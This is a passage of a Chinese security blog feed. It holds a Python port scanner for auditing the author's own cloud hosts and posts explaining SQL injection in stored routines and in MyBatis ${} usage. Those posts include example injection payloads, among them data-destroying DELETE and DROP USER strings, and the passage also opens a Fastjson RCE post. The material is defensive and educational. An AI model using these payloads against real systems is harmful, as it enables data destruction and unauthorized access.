class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># 华为云平台导出的数据需要进行一定的处理，换下行和列。</span><br><span class="hljs-keyword">from</span> socket <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> math<br><span class="hljs-keyword">from</span> checkpms <span class="hljs-keyword">import</span> ip_address_list<br><span class="hljs-keyword">from</span> checkpms <span class="hljs-keyword">import</span> find_Server_Detail<br><br><span class="hljs-comment"># 获取当前主机的Ip地址。</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_host_ip</span>():</span><br>    <span class="hljs-keyword">try</span>:<br>        p = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br>        p.connect((<span class="hljs-string">&#x27;8.8.8.8&#x27;</span>, <span class="hljs-number">80</span>))<br>        ip = p.getsockname()[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">finally</span>:<br>        p.close()<br>    <span class="hljs-keyword">return</span> ip<br><br><span class="hljs-comment"># 用于多线程的资源锁定。在这个项目中，则使用来处理写文件操作。</span><br>lock = threading.Lock()<br><span class="hljs-comment"># 存放内容</span><br>http_URL = []<br><br><span class="hljs-comment"># 网站url</span><br>http_website = []<br><span class="hljs-comment"># 每个线程分配的url</span><br>urlSepList = []<br><br>totally_ipaddress = ip_address_list()<br><br><span class="hljs-comment"># 分离文件名 给每个线程分一个</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">separateName</span>(<span class="hljs-params">threadCount</span>):</span><br>    <span class="hljs-comment"># 使用 math.ceil 函数处理了bug，向上取整，从而使得原来的IP丢失问题得到解决。</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(totally_ipaddress), math.ceil(<span class="hljs-built_in">len</span>(totally_ipaddress) / threadCount)):<br>        <span class="hljs-comment"># urlSepList 将portlist 分成了6段 ip段值，前5个每段106个IP，后一个104（threadCount=6的情况下）</span><br>        urlSepList.append(totally_ipaddress[i:i + math.ceil(<span class="hljs-built_in">len</span>(totally_ipaddress) / threadCount)])<br><br><br><span class="hljs-comment"># 多线程函数</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">multithreading</span>(<span class="hljs-params">threadCount,portlist2</span>):</span><br>    separateName(threadCount)  <span class="hljs-comment"># 先分离</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, threadCount - <span class="hljs-number">1</span>):<br>        <span class="hljs-comment"># 运行多个单线程，构成多线程。其中参数时单线程中定应的参数。</span><br>        t = threading.Thread(target=run_one_thread, args=(urlSepList[i],portlist2))<br>        t.start()<br><br><br><span class="hljs-comment"># 每个线程的运作 ,url_list 是按照线程数分出的ip段。</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run_one_thread</span>(<span class="hljs-params">url_list,portlist2</span>):</span><br>    <span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> portlist2:<br>        <span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> url_list:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;开始核查IP地址&quot;</span>+<span class="hljs-built_in">str</span>(url) + <span class="hljs-string">&quot;端口号为&quot;</span>, <span class="hljs-built_in">str</span>(port))<br>            ok_f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;%d&quot;</span> % port + <span class="hljs-string">&quot;-&quot;</span> + get_host_ip() + <span class="hljs-string">&quot;  port outside.csv&quot;</span>, <span class="hljs-string">&quot;a+&quot;</span>,encoding=<span class="hljs-string">&#x27;GB2312&#x27;</span>)<br>            <span class="hljs-keyword">try</span>:<br>                s = socket.socket(AF_INET, SOCK_STREAM)<br>                s.settimeout(<span class="hljs-number">3</span>)<br>                s.connect((url, port))<br>                <span class="hljs-comment"># 多线程情况下的资源锁定。 lock.acquire()</span><br>                lock.acquire()<br>                <span class="hljs-built_in">print</span>(url + <span class="hljs-string">&quot; is open&quot;</span> + <span class="hljs-string">&quot; %d&quot;</span> % port)<br><br>                ok_f.write(url +<span class="hljs-string">&quot;\n&quot;</span>+find_Server_Detail(url) + <span class="hljs-string">&quot;\n&quot;</span>)<br>                <span class="hljs-comment"># print(&#x27;[+] %d open&#x27; % port)</span><br>                lock.release()<br>                s.close()<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-comment"># raise e</span><br>                <span class="hljs-keyword">pass</span><br>            ok_f.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    portlist = [<span class="hljs-number">80</span>,<span class="hljs-number">334</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span>,<span class="hljs-number">23</span>,<span class="hljs-number">53</span>,<span class="hljs-number">138</span>,<span class="hljs-number">139</span>,<span class="hljs-number">445</span>,<span class="hljs-number">6379</span>]<br>    multithreading(<span class="hljs-number">50</span>,portlist)<br><br></code></pre></td></tr></table></figure><h2 id="checkpms-py-用于提供服务器IP列表和服务器详情信息返回的两个函数。"><a href="#checkpms-py-用于提供服务器IP列表和服务器详情信息返回的两个函数。" class="headerlink" title="checkpms.py 用于提供服务器IP列表和服务器详情信息返回的两个函数。"></a>checkpms.py 用于提供服务器IP列表和服务器详情信息返回的两个函数。</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-comment"># 对于本地的仓库，仅需要commit 而无需进行push.</span><br><span class="hljs-keyword">import</span> csv<br><span class="hljs-keyword">import</span> os<br><br>filename_list = []<br>exclude_list = [<span class="hljs-string">&quot;公网IP&quot;</span>, <span class="hljs-string">&#x27;主IPv4公网IP&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;主IPv4内网IP&#x27;</span>, <span class="hljs-string">&#x27;内网IP&#x27;</span>, <span class="hljs-string">&#x27;私有IP地址&#x27;</span>,<span class="hljs-string">&#x27;弹性公网IP&#x27;</span>]<br>path1 = <span class="hljs-string">&quot;D:\\文档\wyn\\A日常安全检查\\云平台主机端口安全检查\\ali_cloud_address\\&quot;</span><br>path2 = <span class="hljs-string">&quot;D:\\文档\\wyn\\A日常安全检查\\云平台主机端口安全检查\\tencent_cloud_address\\&quot;</span><br>path3 = <span class="hljs-string">&quot;D:\\文档\\wyn\\A日常安全检查\\云平台主机端口安全检查\\huawei_cloud_address\\&quot;</span><br><span class="hljs-comment"># path = [path1,path2,path3]</span><br><span class="hljs-comment"># path = &quot;D:\\文档\wyn\A日常安全检查\\绿云-PMS系统核查\\&quot;</span><br>PATH_LIST = [path1, path2, path3]<br><br><span class="hljs-comment"># 函数作用为对单个路径中的csv文件，形成文件列表。</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">find_filelist</span>(<span class="hljs-params">path</span>):</span><br>    file_name = []<br>    a = os.listdir(path)<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> a:<br>        <span class="hljs-keyword">if</span> os.path.splitext(j)[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;.csv&#x27;</span>:<br>            file_name.append(j)<br>    <span class="hljs-keyword">return</span> file_name<br><br><br><span class="hljs-comment"># 函数作用为返回所有云服务器的Ip地址列表，并且输出相应的IP列表长度。</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ip_address_list</span>():</span><br>    ip_list = []<br>    ip_list_inside = []<br>    filename_list = []<br>    <span class="hljs-keyword">for</span> path <span class="hljs-keyword">in</span> PATH_LIST:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(find_filelist(path)) != <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> find_filelist(path):<br>                filename_list.append(j)<br>            <span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> filename_list:<br>                csv_file = csv.reader(<span class="hljs-built_in">open</span>(path + filename, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>                <span class="hljs-keyword">for</span> stu <span class="hljs-keyword">in</span> csv_file:<br>                    <span class="hljs-comment"># print(stu[11])</span><br>                    <span class="hljs-comment"># 对于华为云导出的数据中外网Ip 后面跟了带宽。如果用python 处理稍显麻烦，则用excel处理。（数据-分列-选择空格 即可）</span><br>                    <span class="hljs-comment"># 另外华为云的数据需要将公网ip 和 内弯IP换下列。</span><br>                    <span class="hljs-keyword">if</span> stu[<span class="hljs-number">11</span>] <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> exclude_list:<br>                         ip_list.append(stu[<span class="hljs-number">11</span>])<br>                    <span class="hljs-keyword">if</span> stu[<span class="hljs-number">12</span>] <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> exclude_list:<br>                        ip_list_inside.append(stu[<span class="hljs-number">12</span>])<br>            filename_list = []<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(ip_list))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(ip_list_inside))<br>    ip_list = ip_list_inside + ip_list<br><br>    <span class="hljs-keyword">return</span> (ip_list)<br><span class="hljs-comment"># 函数的作用在于当发现端口开放时，返回相应的服务器的详情数据。</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">find_Server_Detail</span>(<span class="hljs-params">url</span>):</span><br><br>    result = <span class="hljs-literal">None</span><br>    filename_list = []<br>    <span class="hljs-keyword">for</span> path <span class="hljs-keyword">in</span> PATH_LIST:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(find_filelist(path)) != <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> find_filelist(path):<br>                filename_list.append(j)<br>            <span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> filename_list:<br>                csv_file = csv.reader(<span class="hljs-built_in">open</span>(path + filename, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>                <span class="hljs-keyword">for</span> stu <span class="hljs-keyword">in</span> csv_file:<br>                    <span class="hljs-comment">#print(stu)</span><br>                    <span class="hljs-keyword">if</span> stu[<span class="hljs-number">11</span>] == url <span class="hljs-keyword">or</span> stu[<span class="hljs-number">12</span>] == url:<br>                        result = stu<br><br>            filename_list = []<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(result)<br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(find_Server_Detail(<span class="hljs-string">&#x27;88.88.88.88&#x27;</span>))<br><br><br><br></code></pre></td></tr></table></figure><h2 id="python-在性能，规范化，协作性-方面都被很多人所诟病。-希望我们在写代码的时候，时刻注意这些问题，避免在代码本身缺陷方面不加任何形式的规避和优化。每种语言的特点和劣势都比较明显，选择了，就深爱，深爱就要共同进步。"><a href="#python-在性能，规范化，协作性-方面都被很多人所诟病。-希望我们在写代码的时候，时刻注意这些问题，避免在代码本身缺陷方面不加任何形式的规避和优化。每种语言的特点和劣势都比较明显，选择了，就深爱，深爱就要共同进步。" class="headerlink" title="python 在性能，规范化，协作性 方面都被很多人所诟病。 希望我们在写代码的时候，时刻注意这些问题，避免在代码本身缺陷方面不加任何形式的规避和优化。每种语言的特点和劣势都比较明显，选择了，就深爱，深爱就要共同进步。"></a>python 在性能，规范化，协作性 方面都被很多人所诟病。 希望我们在写代码的时候，时刻注意这些问题，避免在代码本身缺陷方面不加任何形式的规避和优化。每种语言的特点和劣势都比较明显，选择了，就深爱，深爱就要共同进步。</h2></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用预处理的参数化查询就100%安全吗？可以杜绝所有的sql 注入吗</title>
      <link href="/2020/07/20/%E4%BD%BF%E7%94%A8%E9%A2%84%E5%A4%84%E7%90%86%E7%9A%84%E5%8F%82%E6%95%B0%E5%8C%96%E6%9F%A5%E8%AF%A2%E5%B0%B1100-%E5%AE%89%E5%85%A8%E5%90%97%EF%BC%9F%E5%8F%AF%E4%BB%A5%E6%9D%9C%E7%BB%9D%E6%89%80%E6%9C%89%E7%9A%84sql-%E6%B3%A8%E5%85%A5%E5%90%97/"/>
      <url>/2020/07/20/%E4%BD%BF%E7%94%A8%E9%A2%84%E5%A4%84%E7%90%86%E7%9A%84%E5%8F%82%E6%95%B0%E5%8C%96%E6%9F%A5%E8%AF%A2%E5%B0%B1100-%E5%AE%89%E5%85%A8%E5%90%97%EF%BC%9F%E5%8F%AF%E4%BB%A5%E6%9D%9C%E7%BB%9D%E6%89%80%E6%9C%89%E7%9A%84sql-%E6%B3%A8%E5%85%A5%E5%90%97/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>您必须确定许多大型复杂数据库本身就是程序。这些程序的复杂性差别很大，对于内部编程例程，必须注意SQL注入。这样的例程包括触发器，用户定义的函数，存储过程等。这些事物在应用程序级别之间如何交互并不总是很明显，因为许多好的dba在应用程序访问级别和存储级别之间提供了某种程度的抽象。</p><p>使用绑定的参数，将解析查询树，然后至少在PostgreSQL中，对数据进行查看以进行计划。该计划已执行。使用准备好的语句，可以保存计划，因此您可以反复使用不同的数据重新执行同一计划（这可能是您想要的，也可能不是您想要的）。但要点是，对于绑定的参数，参数无法将任何内容注入到解析树中。因此，此类SQL注入问题已得到妥善解决。</p><p>但是现在我们需要记录谁在表中写入内容，因此我们添加了触发器和用户定义的函数来封装这些触发器的逻辑。这些带来了新的问题。如果其中包含任何动态SQL，则必须担心那里存在SQL注入。他们写入的表可能具有自己的触发器，依此类推。类似地，一个函数调用可能会调用另一个查询，后者可能会调用另一个函数调用，依此类推。每一个都是独立于主树计划的。</p><p>这意味着，如果我使用类似的绑定参数运行查询，foo’; drop user postgres; –则它无法直接暗示顶级查询树并导致其添加另一个命令来删除postgres用户。但是，如果此查询是否直接调用另一个函数，则很可能在该行的某处，该函数将很容易受到攻击，而postgres用户将被丢弃。绑定参数对辅助查询不提供任何保护。这些辅助查询需要确保它们也尽可能使用绑定的参数，并且在没有使用绑定参数的情况下，需要使用适当的引用例程。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> sql injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mybatis 使用错误可能引入的SQL 注入</title>
      <link href="/2020/07/20/Mybatis-%E4%BD%BF%E7%94%A8%E9%94%99%E8%AF%AF%E5%8F%AF%E8%83%BD%E5%BC%95%E5%85%A5%E7%9A%84SQL-%E6%B3%A8%E5%85%A5/"/>
      <url>/2020/07/20/Mybatis-%E4%BD%BF%E7%94%A8%E9%94%99%E8%AF%AF%E5%8F%AF%E8%83%BD%E5%BC%95%E5%85%A5%E7%9A%84SQL-%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p><a href="https://www.buhuixiu.com/images/1_lrLeZiGU4eA45R3ssjOY7Q.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/1_lrLeZiGU4eA45R3ssjOY7Q.png"></a></img></p><p>众所周知，MyBatis 的数据地图映射方式，使得我们在面向对象编程中，更加轻松的使用关系型数据库。<br>与传统的ORM解决方案不同，Mybatis maps 对象利用XML描述 SQL声明或者存储过程。这种使用方式提供了<br>完整的控制SQL。但是，如果不正确的使用，仍然会存在sql 注入的问题。</p><h1 id="安全使用方式"><a href="#安全使用方式" class="headerlink" title="安全使用方式"></a>安全使用方式</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;select id=<span class="hljs-string">&quot;getPerson&quot;</span> parameterType=<span class="hljs-string">&quot;int&quot;</span> resultType=<span class="hljs-string">&quot;org.application.vo.Person&quot;</span>&gt;<br>SELECT * FROM PERSON WHERE ID = #&#123;id&#125;<br>&lt;/select&gt;<br></code></pre></td></tr></table></figure><p>使用 # {}方式，使得Mybatis 使用 PreparedStatment parameters(e.g?)  使得值变得安全。相当于下面的使用方式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/* Comparable JDBC code */</span><br>String selectPerson = <span class="hljs-string">&quot;SELECT * FROM PERSON WHERE ID = ?&quot;</span>; <br>PreparedStatement ps = conn.prepareStatement(selectPerson); <br>ps.setInt(<span class="hljs-number">1</span>, id);<br></code></pre></td></tr></table></figure><p>这样SQL 注入得到了防护。<br>下面是几个类似的安全的使用方式。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;insert id=<span class="hljs-string">&quot;insertPerson&quot;</span> parameterType=<span class="hljs-string">&quot;org.application.vo.Person&quot;</span>&gt;<br><span class="hljs-function">insert into <span class="hljs-title">Person</span> <span class="hljs-params">(id, name, email, phone)</span></span><br><span class="hljs-function"><span class="hljs-title">values</span> <span class="hljs-params">(#&#123;id&#125;, #&#123;name&#125;, #&#123;email&#125;, #&#123;phone&#125;)</span></span><br><span class="hljs-function">&lt;/insert&gt;</span><br><span class="hljs-function"> </span><br><span class="hljs-function">&lt;update id</span>=<span class="hljs-string">&quot;updatePerson&quot;</span> parameterType=<span class="hljs-string">&quot;org.application.vo.Person&quot;</span>&gt;<br>update Person set name = #&#123;name&#125;, email = #&#123;email&#125;, phone = #&#123;phone&#125;<br>where id = #&#123;id&#125;<br>&lt;/update&gt;<br> <br> <br>&lt;delete id=<span class="hljs-string">&quot;deletePerson&quot;</span> parameterType=<span class="hljs-string">&quot;int&quot;</span>&gt;<br>delete from Person where id = #&#123;id&#125;<br>&lt;/delete&gt;<br></code></pre></td></tr></table></figure><h1 id="不安全的使用方式"><a href="#不安全的使用方式" class="headerlink" title="不安全的使用方式"></a>不安全的使用方式</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;select id=<span class="hljs-string">&quot;getPerson&quot;</span> parameterType=<span class="hljs-string">&quot;string&quot;</span> resultType=<span class="hljs-string">&quot;org.application.vo.Person&quot;</span>&gt;<br>SELECT * FROM PERSON WHERE NAME = #&#123;name&#125; AND PHONE LIKE <span class="hljs-string">&#x27;$&#123;phone&#125;&#x27;</span>; <br>&lt;/select&gt;<br></code></pre></td></tr></table></figure><p>默认情况下，使用 ${}方式，Mybatis 会直接拼接SQL语句。 Mybatis 不会修改或者过滤字符在应用到拼接SQL语句中前。<br>假设phone 是一个用户可以控制的值，同时，没有进行数据有效性校验和恰当的字符过滤，那么攻击者可以输入一个字符payload<br>例如： “1%‘ OR ‘1’ = ‘1” for phone; 如下。这个查询将返回PERSON 表的所有行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">SELECT * FROM PERSON WHERE NAME = ? and PHONE LIKE <span class="hljs-string">&#x27;1%&#x27;</span> OR <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span><br></code></pre></td></tr></table></figure><p>也可以使用如下的payload ，删除PERSON 表。（适用于特定的关系型数据库） SQLSERVEER OR MYSQL ?</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">SELECT * FROM PERSON WHERE NAME = ? and PHONE LIKE <span class="hljs-string">&#x27;A%&#x27;</span>; DELETE FROM PERSON; --<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>下面的这些，都是不安全的使用范例。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;insert id=<span class="hljs-string">&quot;insertPerson&quot;</span> parameterType=<span class="hljs-string">&quot;org.application.vo.Person&quot;</span>&gt;<br><span class="hljs-function">insert into <span class="hljs-title">Person</span> <span class="hljs-params">(id, name, email, phone)</span></span><br><span class="hljs-function"><span class="hljs-title">values</span> <span class="hljs-params">(#&#123;id&#125;, #&#123;name&#125;, #&#123;email&#125;, $&#123;phone&#125;)</span></span><br><span class="hljs-function">&lt;/insert&gt;</span><br><span class="hljs-function"> </span><br><span class="hljs-function">&lt;update id</span>=<span class="hljs-string">&quot;updatePerson&quot;</span> parameterType=<span class="hljs-string">&quot;org.application.vo.Person&quot;</span>&gt;<br>update Person set phone = $&#123;phone&#125;<br>where id = #&#123;id&#125;<br>&lt;/update&gt;<br> <br> <br>&lt;delete id=<span class="hljs-string">&quot;deletePerson&quot;</span> parameterType=<span class="hljs-string">&quot;int&quot;</span>&gt;<br>delete from Person where id = $&#123;id&#125;<br>&lt;/delete&gt;<br></code></pre></td></tr></table></figure><h1 id="总之，不要使用-方式，在mybatis的xml文件中写查询。。"><a href="#总之，不要使用-方式，在mybatis的xml文件中写查询。。" class="headerlink" title="总之，不要使用 ${} 方式，在mybatis的xml文件中写查询。。"></a>总之，不要使用 ${} 方式，在mybatis的xml文件中写查询。。</h1></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> Sql injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java jndi注入-远程命令执行漏洞-3-如何绕过高版本jdk(8u191)</title>
      <link href="/2020/07/07/Java-JNDI%E6%B3%A8%E5%85%A5%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%ACjdk-8u-191%E4%BB%A5%E4%B8%8A%E7%89%88%E6%9C%AC/"/>
      <url>/2020/07/07/Java-JNDI%E6%B3%A8%E5%85%A5%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%ACjdk-8u-191%E4%BB%A5%E4%B8%8A%E7%89%88%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"</div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Fastjson 相关安全漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson-1-2-47-远程命令执行漏洞-2</title>
      <link href="/2020/07/07/Fastjson-1-2-47-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-2-RMI%E5%92%8CLDAP%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF/"/>
      <url>/2020/07/07/Fastjson-1-2-47-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-2-RMI%E5%92%8CLDAP%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="可以看到我们前面用的payload-发送方式，是RMI-（Remote-Method-Invocation-方式。看到别人说这种方式的限制比较多，反正，我这边受到了jdk版本的限制。。jdk-8u102-版本可以顺利的跑起来计算器，而-jdk-8u181版本，却只是应用崩溃了，RMI远程代码没有执行效果。"><a href="#可以看到我们前面用的payload-发送方式，是RMI-（Remote-Method-Invocation-方式。看到别人说这种方式的限制比较多，反正，我这边受到了jdk版本的限制。。jdk-8u102-版本可以顺利的跑起来计算器，而-jdk-8u181版本，却只是应用崩溃了，RMI远程代码没有执行效果。" class="headerlink" title="可以看到我们前面用的payload 发送方式，是RMI （Remote Method Invocation) 方式。看到别人说这种方式的限制比较多，反正，我这边受到了jdk版本的限制。。jdk:8u102 版本可以顺利的跑起来计算器，而 jdk:8u181版本，却只是应用崩溃了，RMI远程代码没有执行效果。"></a>可以看到我们前面用的payload 发送方式，是RMI （Remote Method Invocation) 方式。看到别人说这种方式的限制比较多，反正，我这边受到了jdk版本的限制。。jdk:8u102 版本可以顺利的跑起来计算器，而 jdk:8u181版本，却只是应用崩溃了，RMI远程代码没有执行效果。</h2><p><a href="https://www.buhuixiu.com/images/jdk102-%E5%85%A8%E5%9B%BE%E8%BF%90%E8%A1%8C.png" class="gallery-item"><img 